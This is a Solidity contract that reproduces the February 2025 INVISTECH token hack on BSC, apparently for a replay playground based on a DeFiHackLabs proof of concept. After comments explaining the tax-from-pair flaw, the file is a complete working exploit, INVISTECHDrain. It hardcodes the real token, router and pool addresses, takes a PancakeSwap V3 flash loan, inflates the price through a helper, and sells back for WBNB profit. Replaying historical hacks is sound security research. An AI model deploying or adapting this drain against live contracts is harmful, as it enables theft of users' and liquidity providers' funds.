// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2025-02-INVISTECH).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (attacker = address(this); the PancakeSwap V3 flash-loan callback
// `pancakeV3FlashCallback` lives on the test itself), so there is no
// standalone exploit contract to deploy. This contract is a faithful,
// self-contained copy of that inline attack (test/INVISTECH_exp.sol) so the
// playground can deploy it and record run() / attack().
//
// The original test also deploys a small helper contract
// (RebuiltInvistechHelper) and `vm.etch`s its runtime code onto the
// historical helper address (which holds a pre-positioned USDT balance in
// the forked state) so the historical helper's balance can be put to work.
// vm.etch has no runtime equivalent in the client-side replay engine, so the
// config uses `codeOverrides` to place that SAME exact runtime bytecode
// (copied verbatim from output.txt's `VM::etch(...)` trace) at
// HISTORICAL_HELPER before the attack runs — a build-time equivalent of
// vm.etch. This exploit contract just calls run() on that address exactly
// like the original test does.
//
// Root cause (real INVISTECH hack, BSC, 2025-02): INVISTECH._transfer taxes
// a buy (pair -> buyer) by debiting the tax FROM THE PAIR ITSELF
// (isPair[sender] branch), pulling tokens out of the pair's reserves beyond
// what the AMM swap() already recorded as amountOut. This desyncs the pair's
// real balance from what swap()'s constant-product check believes it sent,
// skewing the spot price. The attacker flash-buys a large INVT position
// (draining reserves via the tax), re-injects liquidity + buys again via a
// pre-positioned helper to push the price further, then sells the flash-
// bought INVT back into the now over-priced pool for a net WBNB profit.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IWBNB {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IRebuiltHelper {
    function run() external;
}

contract INVISTECHDrain {
    address internal constant HISTORICAL_HELPER = 0x2945b340d851649871a4195Ad68fE0Ac53885591;

    address internal constant INVISTECH_TOKEN = 0xAA217F7BAb90100419b99c027adCf5F0A005C192;
    address internal constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant PANCAKE_V3_POOL = 0x172fcD41E0913e95784454622d1c3724f546f849;

    uint256 internal constant FLASH_AMOUNT = 3_000 ether;

    IPancakeV3Pool internal constant flashPool = IPancakeV3Pool(PANCAKE_V3_POOL);
    IPancakeRouter internal constant router = IPancakeRouter(PANCAKE_ROUTER);
    IERC20 internal constant invistech = IERC20(INVISTECH_TOKEN);
    IWBNB internal constant wbnb = IWBNB(WBNB_TOKEN);

    function run() external {
        flashPool.flash(address(this), 0, FLASH_AMOUNT, "");
    }

    function pancakeV3FlashCallback(uint256, uint256 fee1, bytes calldata) external {
        require(msg.sender == PANCAKE_V3_POOL, "pool only");

        address[] memory buyPath = new address[](2);
        buyPath[0] = WBNB_TOKEN;
        buyPath[1] = INVISTECH_TOKEN;

        wbnb.approve(PANCAKE_ROUTER, type(uint256).max);
        invistech.approve(PANCAKE_ROUTER, type(uint256).max);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            FLASH_AMOUNT, 0, buyPath, address(this), block.timestamp
        );

        IRebuiltHelper(HISTORICAL_HELPER).run();

        address[] memory sellPath = new address[](2);
        sellPath[0] = INVISTECH_TOKEN;
        sellPath[1] = WBNB_TOKEN;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            invistech.balanceOf(address(this)), 0, sellPath, address(this), block.timestamp
        );

        wbnb.transfer(PANCAKE_V3_POOL, FLASH_AMOUNT + fee1);
    }
}
